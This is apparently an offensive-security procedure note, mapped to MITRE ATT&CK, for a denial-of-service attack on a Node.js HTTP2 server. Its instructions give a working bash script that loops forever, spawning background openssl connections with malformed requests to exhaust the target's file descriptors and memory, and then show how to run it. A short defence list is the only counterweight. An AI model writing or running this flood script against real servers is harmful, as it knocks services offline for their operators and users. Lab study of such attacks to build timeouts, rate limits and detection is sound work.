---
id: proc-001
tags:
  - dos
  - http2
  - client-script
type: procedure
tools:
  - '[[tools/openssl]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/send-malformed-http-request]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[OS Exhaustion Flood]]'
updated_at: '2025-12-14T17:26:36.753Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[OS Exhaustion Flood]]'
---
# Create-Malicious-Client-Script-for-HTTP2-DoS

## Summary

This procedure creates a bash script that indefinitely loops to spawn background processes sending malformed HTTP/1.1 requests over SSL to a Node.js HTTP2 server, triggering the unknownProtocol event and causing resource leaks.

## Description

In the context of exploiting the Node.js HTTP2 vulnerability, this script uses openssl to establish connections with invalid protocol data, forcing the server to wait indefinitely for responses without cleaning up resources. It targets localhost:50000 and runs in the background to simulate a flood attack, leading to file descriptor exhaustion or memory leaks.

## Requirements

1. Linux environment with bash and openssl installed
2. Access to the target server port (127.0.0.1:50000)
3. Basic scripting knowledge

## Defense

Defensive measures and detection strategies:

- Implement connection timeouts in HTTP2 servers
- Monitor for unusual connection spikes using tools like netstat or ss
- Use rate limiting on incoming connections

## Objectives

1. Generate malformed requests to trigger unknownProtocol
2. Flood the server to exhaust resources
3. Observe leaks in file descriptors and memory

## Instructions

### Step 1: Create the Script File

**Context**: Write the bash script content to define the request and loop for spawning connections.

**Command** ([[commands/send-malformed-http-request]]):
```bash
cat > client.sh << EOF
#!/bin/bash
request="GET / HTTP/1.1\r\nHost: Anything\r\n\r\n"
while true; do
echo \"$request\" | openssl s_client -connect 127.0.0.1:50000 > /dev/null 2>&1 &
done
EOF
chmod +x client.sh
```

> This creates client.sh with an infinite loop executing the openssl command in the background. Expected output: File created and made executable.

### Step 2: Test the Script

**Context**: Verify the script spawns processes without errors.

**Command**:
```bash
./client.sh
```

> Runs the loop; use Ctrl+C to stop. Expected output: Multiple background processes visible via `ps aux | grep openssl`.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[OS Exhaustion Flood]] OS Exhaustion

### Sub-Techniques


## Commands Used

- [[commands/send-malformed-http-request]]

## Tools Used

- [[tools/openssl]]

## Tags

- dos
- http2
- client-script
